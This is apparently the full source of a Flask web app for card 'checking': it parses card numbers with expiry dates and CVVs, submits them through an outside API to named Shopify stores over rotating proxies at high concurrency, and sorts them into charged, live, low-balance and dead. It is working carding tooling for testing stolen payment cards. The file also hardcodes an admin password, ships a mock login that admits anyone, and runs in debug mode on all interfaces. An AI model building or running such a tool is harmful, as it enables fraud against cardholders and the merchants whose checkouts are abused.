import os
import json
import random
import re
import time
import asyncio
import aiohttp
import psycopg2
import psycopg2.pool
import hashlib
import hmac
from flask import Flask, render_template, request, jsonify, Response, session, redirect, url_for
from dotenv import load_dotenv
from collections import deque
from threading import Lock

load_dotenv()

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
os.makedirs(DATA_DIR, exist_ok=True)

SITES_FILE = os.path.join(DATA_DIR, "sites.json")
PROXIES_FILE = os.path.join(DATA_DIR, "proxies.json")
_file_lock = Lock()

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "mlsn-web-checker-secret")
app.config['MAX_CONTENT_LENGTH'] = 200 * 1024 * 1024

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_BOT_USERNAME = os.getenv("TELEGRAM_BOT_USERNAME", "")


def verify_telegram_auth(auth_data):
    check_hash = auth_data.get('hash')
    if not check_hash or not TELEGRAM_BOT_TOKEN:
        return False

    try:
        auth_date = int(auth_data.get('auth_date', 0))
        if time.time() - auth_date > 86400:
            return False
    except:
        return False

    data_list = []
    for k, v in sorted(auth_data.items()):
        if k != 'hash' and v is not None:
            data_list.append(f"{k}={v}")
    data_check_string = "\n".join(data_list)

    secret_key = hashlib.sha256(TELEGRAM_BOT_TOKEN.encode('utf-8')).digest()
    computed_hash = hmac.new(secret_key, data_check_string.encode('utf-8'), hashlib.sha256).hexdigest()

    return computed_hash == check_hash


@app.before_request
def require_login():
    allowed_routes = ['login', 'api_login_telegram', 'api_login_admin', 'api_login_mock']
    if request.endpoint in allowed_routes or request.path.startswith('/static/'):
        return

    is_logged_in = session.get('user') is not None or session.get('admin') is True

    if not is_logged_in:
        return redirect(url_for('login', next=request.path))

    if request.path.startswith('/vanlinh') and not session.get('admin'):
        return redirect(url_for('login', admin='1', next=request.path))

DATABASE_URL = os.getenv("DATABASE_URL", "")
SAC_API = os.getenv("SAC_API", "https://sac-1-qg37.onrender.com")

DB_POOL = None
DB_POOL_MIN = 2
DB_POOL_MAX = 20

DEFAULT_SHOPIFY_SITES = [
    "https://reston-lloyd.myshopify.com",
    "https://favorstoday.com",
    "https://happyhentreats.com",
    "https://shop.yorkspacesystems.com",
    "https://davids-toothpaste.myshopify.com"
]

DB_SITES_CACHE = None
DB_PROXIES_CACHE = None
DB_CACHE_TIME = 0
DB_CACHE_TTL = 300

RECENT_SITES = deque(maxlen=50)
RECENT_PROXIES = deque(maxlen=50)

CHARGED_KEYWORDS = frozenset([
    'charged', 'charge success', 'charge_success',
    'order complete', 'order_complete', 'order completed', 'order_completed',
    'order confirmed', 'order_confirmed',
    'order placed', 'order_placed',
    'thank you', 'thankyou', 'thank_you',
    'captured', 'capture_succeeded', 'capture succeeded',
    'paid', 'settled', 'succeeded',
    'payment successful', 'payment_successful', 'payment success',
    'payment complete', 'payment_complete', 'payment_completed',
    'purchase complete', 'purchase_complete',
    'transaction approved', 'transaction_approved', 'transaction successful',
    'transaction_successful',
    'sale approved', 'sale_approved',
    'cnb', 'amount_charged',
])

SHOPIFY_WEB_ERROR_KEYWORDS = [
    'web_error', 'shopify_web_error', 'site_error', 'gateway_error',
    'bad_request', 'server_error', 'internal_error', 'temporarily_unavailable',
    'maintenance', 'under_construction', 'try_again_later',
    'detected_http', 'detected_http_', 'detected_bot', 'bot_detected', 'captcha',
    'cloudflare', 'challenge_platform', 'cf_chl', 'js_challenge',
    'access_denied', 'forbidden', 'rate_limit', 'too_many_requests',
    'waf', 'firewall',
]

SHOPIFY_3DS_KEYWORDS = [
    '3d_secure', '3ds', 'three_d_secure', 'three d secure',
    'authentication_required', 'requires_action', 'payer_action',
    'redirect_to_3ds', 'challenge_required',
]


def init_db_tables():
    if not DATABASE_URL:
        return
    try:
        conn = psycopg2.connect(DATABASE_URL, connect_timeout=3)
        with conn.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS sites (
                    id SERIAL PRIMARY KEY,
                    url TEXT UNIQUE NOT NULL
                );
            """)
            cur.execute("""
                CREATE TABLE IF NOT EXISTS proxies (
                    id SERIAL PRIMARY KEY,
                    proxy TEXT UNIQUE NOT NULL
                );
            """)
            conn.commit()
        conn.close()
    except Exception as e:
        print("DB table creation failed:", e)


def get_db():
    global DB_POOL
    try:
        if DB_POOL is None and DATABASE_URL:
            init_db_tables()
            DB_POOL = psycopg2.pool.ThreadedConnectionPool(
                DB_POOL_MIN, DB_POOL_MAX,
                DATABASE_URL,
                connect_timeout=3
            )
        if DB_POOL:
            return DB_POOL.getconn()
        return None
    except:
        return None


def release_db(conn):
    global DB_POOL
    if conn and DB_POOL:
        try:
            DB_POOL.putconn(conn)
        except:
            try:
                conn.close()
            except:
                pass


def _load_db_sites():
    global DB_SITES_CACHE, DB_CACHE_TIME
    now = time.time()
    if DB_SITES_CACHE is not None and (now - DB_CACHE_TIME) < DB_CACHE_TTL:
        return DB_SITES_CACHE
    conn = get_db()
    if not conn:
        DB_SITES_CACHE = DEFAULT_SHOPIFY_SITES[:]
        DB_CACHE_TIME = now
        return DB_SITES_CACHE
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT DISTINCT url FROM sites ORDER BY url")
            sites = [row[0] for row in cur.fetchall() if row[0]]
            DB_SITES_CACHE = sites if sites else DEFAULT_SHOPIFY_SITES[:]
            DB_CACHE_TIME = now
            return DB_SITES_CACHE
    except:
        DB_SITES_CACHE = DEFAULT_SHOPIFY_SITES[:]
        DB_CACHE_TIME = now
        return DB_SITES_CACHE
    finally:
        release_db(conn)


def _load_db_proxies():
    global DB_PROXIES_CACHE, DB_CACHE_TIME
    now = time.time()
    if DB_PROXIES_CACHE is not None and (now - DB_CACHE_TIME) < DB_CACHE_TTL:
        return DB_PROXIES_CACHE
    conn = get_db()
    if not conn:
        DB_PROXIES_CACHE = []
        DB_CACHE_TIME = now
        return DB_PROXIES_CACHE
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT DISTINCT proxy FROM proxies ORDER BY proxy")
            DB_PROXIES_CACHE = [row[0] for row in cur.fetchall() if row[0]]
            DB_CACHE_TIME = now
            return DB_PROXIES_CACHE
    except:
        DB_PROXIES_CACHE = []
        DB_CACHE_TIME = now
        return DB_PROXIES_CACHE
    finally:
        release_db(conn)


def _load_file(path):
    try:
        with open(path, 'r') as f:
            return json.load(f)
    except:
        return []


def _save_file(path, data):
    with _file_lock:
        with open(path, 'w') as f:
            json.dump(data, f)


def get_sites():
    db_sites = _load_db_sites()
    file_sites = _load_file(SITES_FILE)
    combined = list(dict.fromkeys(db_sites + file_sites))
    if not combined:
        return DEFAULT_SHOPIFY_SITES[:]
    return combined


def get_proxies():
    db_proxies = _load_db_proxies()
    file_proxies = _load_file(PROXIES_FILE)
    return list(dict.fromkeys(db_proxies + file_proxies))


def pick_random_site(sites):
    if not sites:
        return ""
    available = [s for s in sites if s not in RECENT_SITES]
    if not available:
        RECENT_SITES.clear()
        available = sites
    choice = random.choice(available)
    RECENT_SITES.append(choice)
    return choice


def pick_random_proxy(proxies):
    if not proxies:
        return ""
    available = [p for p in proxies if p not in RECENT_PROXIES]
    if not available:
        RECENT_PROXIES.clear()
        available = proxies
    choice = random.choice(available)
    RECENT_PROXIES.append(choice)
    return choice


def format_proxy_for_api(proxy_raw):
    if not proxy_raw:
        return ""
    clean = proxy_raw.strip()
    if "://" in clean:
        clean = clean.split("://", 1)[1]
    if "@" in clean:
        return clean
    parts = clean.split(":")
    if len(parts) == 4:
        ip, port, user, passwd = parts
        return f"{user}:{passwd}@{ip}:{port}"
    elif len(parts) == 2:
        return clean
    return proxy_raw


def parse_cards(text):
    cards = []
    lines = [line.strip() for line in text.split('\n') if line.strip()]
    for line in lines:
        card_str = line.strip()
        card_str = re.sub(r'\s+', ' ', card_str)
        match = re.search(r'(\d{13,19})\s*[|/]\s*(\d{1,2})\s*[|/]\s*(\d{2,4})\s*[|/]\s*(\d{3,4})', card_str)
        if match:
            cards.append({
                'cc': match.group(1),
                'mm': match.group(2).zfill(2),
                'yy': match.group(3)[-2:],
                'cvv': match.group(4),
                'formatted': f"{match.group(1)}|{match.group(2).zfill(2)}|{match.group(3)}|{match.group(4)}"
            })
            continue
        match = re.search(r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})', card_str)
        if match:
            cards.append({
                'cc': match.group(1),
                'mm': match.group(2).zfill(2),
                'yy': match.group(3)[-2:],
                'cvv': match.group(4),
                'formatted': f"{match.group(1)}|{match.group(2).zfill(2)}|{match.group(3)}|{match.group(4)}"
            })
    return cards


def classify_response(api_response):
    combined = api_response.lower().strip().replace('_', ' ').replace('-', ' ')
    raw = api_response.lower().strip()

    if any(k in combined for k in CHARGED_KEYWORDS):
        return "CHARGED", "🔥"
    if any(k in raw for k in ["fraud", "fraudulent", "high risk", "high_risk", "risk_review", "risk review", "suspicious", "do_not_honor", "do not honor", "pickup_card", "pickup card", "lost_card", "lost card", "stolen_card", "stolen card"]):
        return "FRAUD", "⚠️"
    if any(k in raw for k in ["cvv", "ccn", "avs", "security code", "incorrect cvc", "incorrect_cvc", "cvc mismatch", "cvc_mismatch", "cvv mismatch", "cvv_mismatch", "avs mismatch", "avs_mismatch", "address mismatch", "address_mismatch", "zip code", "postal code", "billing address mismatch", "billing_address_mismatch"]):
        return "LIVE", "✅"
    if any(k in raw for k in ["insufficient", "low balance", "low_balance", "funds", "not enough", "limit exceeded", "credit limit"]):
        return "LOW_BALANCE", "🎆"
    if any(k in raw for k in ["otp", "3d secure", "3d_secure", "3ds", "three_d_secure", "authentication required", "authentication_required", "requires_action", "payer_action", "payer_action_required", "redirect_to_3ds", "challenge", "vbv", "securecode", "sca_required", "sca required"]) or any(k in raw for k in SHOPIFY_3DS_KEYWORDS):
        return "OTP_REQUIRED", "✅"
    if "approved" in combined or "authorized" in combined or "authorised" in combined:
        if not any(neg in combined for neg in ("not approved", "unapproved", "not authorized", "declined")):
            return "LIVE", "✅"
    if any(k in raw for k in SHOPIFY_WEB_ERROR_KEYWORDS):
        return "ERROR", "⚠️"
    if any(k in raw for k in ["declined", "dead", "invalid", "failed", "rejected", "card declined", "card_declined", "generic decline", "generic_decline"]):
        return "DEAD", "❌"
    if "error" in raw:
        return "ERROR", "⚠️"
    return "UNKNOWN", "⚠️"


NO_RETRY_STATUSES = frozenset(["CHARGED", "FRAUD", "LIVE", "DEAD", "LOW_BALANCE", "OTP_REQUIRED"])

EXPIRY_KEYWORDS = frozenset([
    "expired", "expiry", "expiration", "invalid month", "invalid year",
    "invalid date", "card expired", "card exp", "bad expiry", "bad expiration",
    "month invalid", "year invalid", "exp date", "exp month", "exp year",
])


def _is_expiry_error(msg):
    m = msg.lower()
    return any(k in m for k in EXPIRY_KEYWORDS)


async def _do_check(session, card, site, proxy_raw):
    cc = card.get('formatted', '')
    proxy_converted = format_proxy_for_api(proxy_raw) if proxy_raw else ""
    url = f"{SAC_API}/mlsn?cc={cc}&site={site}"
    if proxy_converted:
        url += f"&proxy={proxy_converted}"

    try:
        timeout = aiohttp.ClientTimeout(total=90)
        async with session.get(url, timeout=timeout, ssl=False) as resp:
            try:
                raw = await resp.json(content_type=None)
            except:
                text = await resp.text()
                text = re.sub(r'<[^>]+>', '', text).strip()[:200]
                return {'status': 'ERROR', 'msg': text, 'emoji': '⚠️',
                        'price': '-', 'gateway': 'Shopify', 'site': site, 'receipt_id': 'N/A'}

            api_response = str(raw.get("Response") or raw.get("response") or raw.get("message") or "").strip()
            price_raw = raw.get("Price") or raw.get("price") or raw.get("amount") or "-"
            currency = str(raw.get("Currency") or raw.get("currency") or "").strip()
            check_time = raw.get("Time") or raw.get("time") or raw.get("elapsed") or ""

            if price_raw and str(price_raw) not in ("-", ""):
                try:
                    price_val = f"{float(str(price_raw)):.2f}"
                    price_raw = f"{price_val} {currency}" if currency else f"${price_val}"
                except:
                    price_raw = f"{price_raw} {currency}" if currency else str(price_raw)

            gateway = raw.get("Gateway") or raw.get("gateway") or raw.get("Gate") or "Shopify Payments"
            receipt_id = str(raw.get("receipt_id") or raw.get("Receipt ID") or raw.get("receipt_ID") or "N/A").strip()
            status, emoji = classify_response(api_response)

            if status == "UNKNOWN" and api_response:
                api_status = raw.get("Status") or raw.get("status")
                if api_status is False or api_status == "false":
                    status = "ERROR"
                    emoji = "⚠️"

            return {
                'status': status, 'msg': api_response, 'emoji': emoji,
                'price': str(price_raw), 'gateway': gateway, 'site': site,
                'receipt_id': receipt_id, 'time': str(check_time) if check_time else "-"
            }
    except asyncio.TimeoutError:
        return {'status': 'TIMEOUT', 'msg': 'Request Timeout (90s)', 'emoji': '⏰',
                'price': '-', 'gateway': 'Shopify', 'site': site, 'receipt_id': 'N/A'}
    except Exception as e:
        return {'status': 'EXCEPTION', 'msg': str(e)[:100], 'emoji': '🔥',
                'price': '-', 'gateway': 'Shopify', 'site': site, 'receipt_id': 'N/A'}


MAX_RETRIES = 5


async def check_card(session, card, sites, proxies):
    last_result = None
    for attempt in range(MAX_RETRIES):
        site = pick_random_site(sites) if sites else ""
        proxy = pick_random_proxy(proxies) if proxies else ""
        result = await _do_check(session, card, site, proxy)
        last_result = result

        if result['status'] in NO_RETRY_STATUSES:
            return result

        if result['status'] == 'ERROR' and _is_expiry_error(result.get('msg', '')):
            return result

        if result['status'] not in ('ERROR', 'TIMEOUT', 'EXCEPTION', 'UNKNOWN'):
            return result

    return last_result


async def check_cards_batch(cards, sites, proxies, concurrency=1000):
    semaphore = asyncio.Semaphore(concurrency)
    connector = aiohttp.TCPConnector(limit=1000, limit_per_host=100, ttl_dns_cache=300, use_dns_cache=True)
    results = []

    async def check_one(card, session):
        async with semaphore:
            result = await check_card(session, card, sites, proxies)
            result['card'] = card.get('formatted', '')
            return result

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [check_one(card, session) for card in cards]
        for coro in asyncio.as_completed(tasks):
            result = await coro
            results.append(result)

    return results


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/check_batch', methods=['POST'])
def api_check_batch():
    data = request.json or {}
    cards = data.get('cards', [])
    if not cards:
        return jsonify({'error': 'No cards provided'}), 400

    # Extract user-specific proxies (no longer fallback to global DB)
    proxies = data.get('proxies', [])

    # Extract custom concurrency/semaphore
    concurrency = data.get('concurrency') or data.get('semaphore') or 1000
    try:
        concurrency = int(concurrency)
    except:
        concurrency = 1000

    sites = get_sites()

    try:
        loop = asyncio.new_event_loop()
        try:
            results = loop.run_until_complete(check_cards_batch(cards, sites, proxies, concurrency=concurrency))
        finally:
            loop.close()
        return jsonify({'results': results})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/check', methods=['POST'])
def api_check():
    data = request.json or {}
    cards_text = data.get('cards', '')
    cards = parse_cards(cards_text)
    if not cards:
        return jsonify({'error': 'No valid cards found'}), 400

    # Extract user-specific proxies (no longer fallback to global DB)
    proxies = data.get('proxies', [])

    # Extract custom concurrency/semaphore
    concurrency = data.get('concurrency') or data.get('semaphore') or 1000
    try:
        concurrency = int(concurrency)
    except:
        concurrency = 1000

    sites = get_sites()

    def generate():
        all_results = []
        loop = asyncio.new_event_loop()
        try:
            batch_size = 200
            for i in range(0, len(cards), batch_size):
                batch = cards[i:i+batch_size]
                batch_results = loop.run_until_complete(check_cards_batch(batch, sites, proxies, concurrency=concurrency))
                all_results.extend(batch_results)
                stats = {
                    'total': len(all_results),
                    'done': len(all_results),
                    'charged': sum(1 for r in all_results if r['status'] == 'CHARGED'),
                    'live': sum(1 for r in all_results if r['status'] == 'LIVE'),
                    'fraud': sum(1 for r in all_results if r['status'] == 'FRAUD'),
                    'dead': sum(1 for r in all_results if r['status'] == 'DEAD'),
                    'error': sum(1 for r in all_results if r['status'] in ('ERROR', 'TIMEOUT', 'EXCEPTION')),
                    'low_balance': sum(1 for r in all_results if r['status'] == 'LOW_BALANCE'),
                    'otp': sum(1 for r in all_results if r['status'] == 'OTP_REQUIRED'),
                }
                yield f"data: {json.dumps({'type': 'batch', 'results': batch_results, 'stats': stats, 'total_cards': len(cards)})}\n\n"
            yield f"data: {json.dumps({'type': 'done', 'stats': stats, 'total_cards': len(cards)})}\n\n"
        finally:
            loop.close()

    return Response(generate(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})


@app.route('/api/check/upload', methods=['POST'])
def api_check_upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    file = request.files['file']
    if not file.filename:
        return jsonify({'error': 'No file selected'}), 400

    content = file.read().decode('utf-8', errors='ignore')
    cards = parse_cards(content)
    if not cards:
        return jsonify({'error': 'No valid cards found in file'}), 400

    # Extract user-specific proxies from form data
    proxies_raw = request.form.get('proxies', '')
    if proxies_raw:
        try:
            proxies = json.loads(proxies_raw)
        except:
            proxies = [p.strip() for p in proxies_raw.split('\n') if p.strip()]
    else:
        proxies = []

    # Extract custom concurrency/semaphore from form data
    concurrency = request.form.get('concurrency') or request.form.get('semaphore') or 1000
    try:
        concurrency = int(concurrency)
    except:
        concurrency = 1000

    sites = get_sites()

    def generate():
        all_results = []
        loop = asyncio.new_event_loop()
        try:
            batch_size = 200
            for i in range(0, len(cards), batch_size):
                batch = cards[i:i+batch_size]
                batch_results = loop.run_until_complete(check_cards_batch(batch, sites, proxies, concurrency=concurrency))
                all_results.extend(batch_results)
                stats = {
                    'total': len(all_results),
                    'done': len(all_results),
                    'charged': sum(1 for r in all_results if r['status'] == 'CHARGED'),
                    'live': sum(1 for r in all_results if r['status'] == 'LIVE'),
                    'fraud': sum(1 for r in all_results if r['status'] == 'FRAUD'),
                    'dead': sum(1 for r in all_results if r['status'] == 'DEAD'),
                    'error': sum(1 for r in all_results if r['status'] in ('ERROR', 'TIMEOUT', 'EXCEPTION')),
                    'low_balance': sum(1 for r in all_results if r['status'] == 'LOW_BALANCE'),
                    'otp': sum(1 for r in all_results if r['status'] == 'OTP_REQUIRED'),
                }
                yield f"data: {json.dumps({'type': 'batch', 'results': batch_results, 'stats': stats, 'total_cards': len(cards)})}\n\n"
            yield f"data: {json.dumps({'type': 'done', 'stats': stats, 'total_cards': len(cards)})}\n\n"
        finally:
            loop.close()

    return Response(generate(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})


@app.route('/api/stats', methods=['GET'])
def api_stats():
    user_sites = _load_file(SITES_FILE)
    user_proxies = _load_file(PROXIES_FILE)

    if user_sites:
        sc = len(user_sites)
    elif DB_SITES_CACHE is not None:
        sc = len(DB_SITES_CACHE)
    else:
        sc = len(DEFAULT_SHOPIFY_SITES)

    pc = len(user_proxies) if user_proxies else 0
    if not user_proxies and not pc:
        db_p = _load_db_proxies()
        pc = len(db_p)

    return jsonify({'sites_count': sc, 'proxies_count': pc, 'api_url': SAC_API})


@app.route('/api/sites/upload', methods=['POST'])
def api_upload_sites():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    file = request.files['file']
    if not file.filename:
        return jsonify({'error': 'No file selected'}), 400
    content = file.read().decode('utf-8', errors='ignore')
    lines = [l.strip() for l in content.split('\n') if l.strip()]
    if not lines:
        return jsonify({'error': 'Empty file'}), 400
    sites = list(dict.fromkeys(lines))
    _save_file(SITES_FILE, sites)
    return jsonify({'loaded': len(sites)})


@app.route('/api/proxies/upload', methods=['POST'])
def api_upload_proxies():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    file = request.files['file']
    if not file.filename:
        return jsonify({'error': 'No file selected'}), 400
    content = file.read().decode('utf-8', errors='ignore')
    lines = [l.strip() for l in content.split('\n') if l.strip()]
    if not lines:
        return jsonify({'error': 'Empty file'}), 400
    proxies = list(dict.fromkeys(lines))
    _save_file(PROXIES_FILE, proxies)
    return jsonify({'loaded': len(proxies)})


@app.route('/api/sites/clear', methods=['POST'])
def api_clear_sites():
    _save_file(SITES_FILE, [])
    return jsonify({'cleared': True})


@app.route('/api/proxies/clear', methods=['POST'])
def api_clear_proxies():
    _save_file(PROXIES_FILE, [])
    return jsonify({'cleared': True})


def db_add_site(url):
    conn = get_db()
    if conn:
        try:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO sites (url) VALUES (%s) ON CONFLICT (url) DO NOTHING", (url,))
                conn.commit()
        except:
            pass
        finally:
            release_db(conn)


def db_delete_site(url):
    conn = get_db()
    if conn:
        try:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM sites WHERE url = %s", (url,))
                conn.commit()
        except:
            pass
        finally:
            release_db(conn)


def db_add_proxy(proxy):
    conn = get_db()
    if conn:
        try:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO proxies (proxy) VALUES (%s) ON CONFLICT (proxy) DO NOTHING", (proxy,))
                conn.commit()
        except:
            pass
        finally:
            release_db(conn)


def db_delete_proxy(proxy):
    conn = get_db()
    if conn:
        try:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM proxies WHERE proxy = %s", (proxy,))
                conn.commit()
        except:
            pass
        finally:
            release_db(conn)


@app.route('/login')
def login():
    bot_username = os.getenv("TELEGRAM_BOT_USERNAME", "")
    return render_template('login.html', bot_username=bot_username)


@app.route('/api/login/admin', methods=['POST'])
def api_login_admin():
    data = request.json or {}
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()

    if username == "vanlinhcute" and password == "gaidepknoinhieu":
        session['admin'] = True
        session['user'] = "vanlinhcute"
        return jsonify({'success': True, 'redirect': '/vanlinh'})

    return jsonify({'error': 'Incorrect credentials'}), 401


@app.route('/api/login/telegram', methods=['GET'])
def api_login_telegram():
    auth_data = request.args.to_dict()

    if os.getenv("TELEGRAM_BOT_TOKEN"):
        if verify_telegram_auth(auth_data):
            session['user'] = auth_data.get('username') or auth_data.get('first_name') or auth_data.get('id')
            return redirect('/')
        else:
            return "Telegram authentication failed.", 401
    else:
        username = auth_data.get('username') or auth_data.get('first_name') or "test_user"
        session['user'] = username
        return redirect('/')


@app.route('/api/login/mock', methods=['POST'])
def api_login_mock():
    data = request.json or {}
    username = data.get('username', '').strip()
    if not username:
        return jsonify({'error': 'Username is empty'}), 400
    session['user'] = username
    return jsonify({'success': True, 'redirect': '/'})


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/vanlinh')
def vanlinh_admin():
    return render_template('vanlinh.html')


@app.route('/api/admin/db_info', methods=['GET'])
def api_admin_db_info():
    # Load sites
    db_sites = _load_db_sites()
    file_sites = _load_file(SITES_FILE)
    sites = list(dict.fromkeys(db_sites + file_sites))

    # Load proxies
    db_proxies = _load_db_proxies()
    file_proxies = _load_file(PROXIES_FILE)
    proxies = list(dict.fromkeys(db_proxies + file_proxies))

    # Mask database connection string
    db_status = "Disconnected"
    masked_url = "None"
    if DATABASE_URL:
        db_status = "Connected"
        parts = DATABASE_URL.split('@')
        if len(parts) > 1:
            masked_url = "postgresql://***:***@" + parts[1].split('?')[0]
        else:
            masked_url = "postgresql://***"

        # Check connection validity
        conn = get_db()
        if conn:
            db_status = "Connected (Active)"
            release_db(conn)
        else:
            db_status = "Connected (Connection Error)"

    return jsonify({
        'db_status': db_status,
        'db_url': masked_url,
        'sites': sites,
        'proxies': proxies
    })


@app.route('/api/admin/site/add', methods=['POST'])
def api_admin_add_site():
    data = request.json or {}
    url = data.get('url', '').strip()
    if not url:
        return jsonify({'error': 'URL is empty'}), 400

    # Save to local file
    file_sites = _load_file(SITES_FILE)
    if url not in file_sites:
        file_sites.append(url)
        _save_file(SITES_FILE, file_sites)

    # Save to DB
    db_add_site(url)

    # Clear DB cache
    global DB_SITES_CACHE
    DB_SITES_CACHE = None

    return jsonify({'success': True})


@app.route('/api/admin/site/delete', methods=['POST'])
def api_admin_delete_site():
    data = request.json or {}
    url = data.get('url', '').strip()
    if not url:
        return jsonify({'error': 'URL is empty'}), 400

    # Remove from local file
    file_sites = _load_file(SITES_FILE)
    if url in file_sites:
        file_sites.remove(url)
        _save_file(SITES_FILE, file_sites)

    # Delete from DB
    db_delete_site(url)

    # Clear DB cache
    global DB_SITES_CACHE
    DB_SITES_CACHE = None

    return jsonify({'success': True})


@app.route('/api/admin/proxy/add', methods=['POST'])
def api_admin_add_proxy():
    data = request.json or {}
    proxy = data.get('proxy', '').strip()
    if not proxy:
        return jsonify({'error': 'Proxy is empty'}), 400

    # Save to local file
    file_proxies = _load_file(PROXIES_FILE)
    if proxy not in file_proxies:
        file_proxies.append(proxy)
        _save_file(PROXIES_FILE, file_proxies)

    # Save to DB
    db_add_proxy(proxy)

    # Clear DB cache
    global DB_PROXIES_CACHE
    DB_PROXIES_CACHE = None

    return jsonify({'success': True})


@app.route('/api/admin/proxy/delete', methods=['POST'])
def api_admin_delete_proxy():
    data = request.json or {}
    proxy = data.get('proxy', '').strip()
    if not proxy:
        return jsonify({'error': 'Proxy is empty'}), 400

    # Remove from local file
    file_proxies = _load_file(PROXIES_FILE)
    if proxy in file_proxies:
        file_proxies.remove(proxy)
        _save_file(PROXIES_FILE, file_proxies)

    # Delete from DB
    db_delete_proxy(proxy)

    # Clear DB cache
    global DB_PROXIES_CACHE
    DB_PROXIES_CACHE = None

    return jsonify({'success': True})


if __name__ == '__main__':
    port = int(os.getenv('PORT', 8000))
    app.run(host='0.0.0.0', port=port, debug=True)
